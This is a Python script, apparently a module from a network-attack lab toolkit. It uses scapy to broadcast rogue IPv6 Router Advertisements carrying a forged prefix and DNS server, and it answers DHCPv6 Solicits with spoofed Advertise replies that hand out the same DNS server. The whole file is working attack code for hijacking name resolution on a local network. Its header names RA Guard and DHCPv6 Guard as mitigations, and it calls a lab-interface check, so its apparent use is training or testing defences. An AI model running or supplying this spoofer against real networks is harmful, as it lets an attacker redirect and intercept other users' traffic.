#!/usr/bin/env python3
"""FHRP/ROUTING: rogue IPv6 Router Advertisement + opportunistic DHCPv6
spoof. Mitigation: IPv6 RA Guard + DHCPv6 Guard (see README).

Simplified on purpose: the RA send is the guaranteed, every-interval action
(matching every other module's run_loop skeleton); the DHCPv6 half is
best-effort — each round briefly sniffs for a DHCPv6 Solicit and replies
with an Advertise handing out the forged DNS server, rather than running
two independent continuous loops. This keeps the helper on the same shared
skeleton as the other 17 modules instead of a bespoke two-thread design.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok  # noqa: E402


def build_ra(scapy_all, prefix_cidr, dns_server):
    from scapy.layers.inet6 import (IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
                                     ICMPv6NDOptSrcLLAddr, ICMPv6NDOptRDNSS)
    Ether = scapy_all.Ether
    prefix, plen = (prefix_cidr.split("/") + ["64"])[:2]
    ra = ICMPv6ND_RA(chlim=64, routerlifetime=1800)
    opt_prefix = ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=int(plen), validlifetime=86400, preferredlifetime=14400)
    opt_dns = ICMPv6NDOptRDNSS(dns=[dns_server], lifetime=1800)
    return (Ether(dst="33:33:00:00:00:01") /
            IPv6(dst="ff02::1") /
            ra / opt_prefix / ICMPv6NDOptSrcLLAddr(lladdr="02:00:00:aa:bb:cc") / opt_dns)


def build_dhcp6_advertise(scapy_all, solicited_pkt, dns_server):
    from scapy.layers.dhcp6 import DHCP6_Advertise, DHCP6OptServerId, DHCP6OptClientId, DHCP6OptDNSServers
    from scapy.layers.inet6 import IPv6, UDP
    Ether = scapy_all.Ether
    trid = solicited_pkt.trid if hasattr(solicited_pkt, "trid") else 0
    cid = solicited_pkt.getlayer(DHCP6OptClientId)
    reply = DHCP6_Advertise(trid=trid) / DHCP6OptServerId(duid=bytes.fromhex("0003000102000000aabb")) / DHCP6OptDNSServers(dnsservers=[dns_server])
    if cid:
        reply = DHCP6_Advertise(trid=trid) / cid / DHCP6OptServerId(duid=bytes.fromhex("0003000102000000aabb")) / DHCP6OptDNSServers(dnsservers=[dns_server])
    return Ether(dst=solicited_pkt[Ether].src) / IPv6(dst=solicited_pkt[IPv6].src) / UDP(sport=547, dport=546) / reply


def main():
    p = base_parser("Rogue IPv6 RA + opportunistic DHCPv6 spoof")
    p.add_argument("--prefix", default="2001:db8:dead::/64", help="advertised on-link prefix")
    p.add_argument("--dns_server", default="2001:db8:dead::1", help="DNS (RDNSS) to advertise / hand out via DHCPv6")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_ra(scapy_all, args.prefix, args.dns_server)
    if args.selftest:
        selftest_ok("ra_spoof", "RA len=%d prefix=%s" % (len(bytes(pkt)), args.prefix))
        return

    def round_(n):
        scapy_all.sendp(build_ra(scapy_all, args.prefix, args.dns_server), iface=args.iface, verbose=0)
        status("SENT", "RA #%d prefix=%s dns=%s" % (n + 1, args.prefix, args.dns_server))

        # Best-effort DHCPv6: sniff briefly for a Solicit and answer it.
        try:
            from scapy.layers.dhcp6 import DHCP6_Solicit
            from scapy.layers.inet6 import IPv6
            got = scapy_all.sniff(iface=args.iface, timeout=min(2.0, max(0.1, args.interval)),
                                   lfilter=lambda pk: pk.haslayer(DHCP6_Solicit), store=1)
            for pk in got:
                scapy_all.sendp(build_dhcp6_advertise(scapy_all, pk, args.dns_server), iface=args.iface, verbose=0)
                status("SENT", "DHCPv6 Advertise -> %s (dns=%s)" % (pk[IPv6].src, args.dns_server))
        except Exception as e:  # best-effort only; RA above is the guaranteed action
            status("WARN", "dhcpv6 opportunistic reply skipped: %s" % e)

    run_loop(args.count, args.interval, round_)


if __name__ == "__main__":
    main()

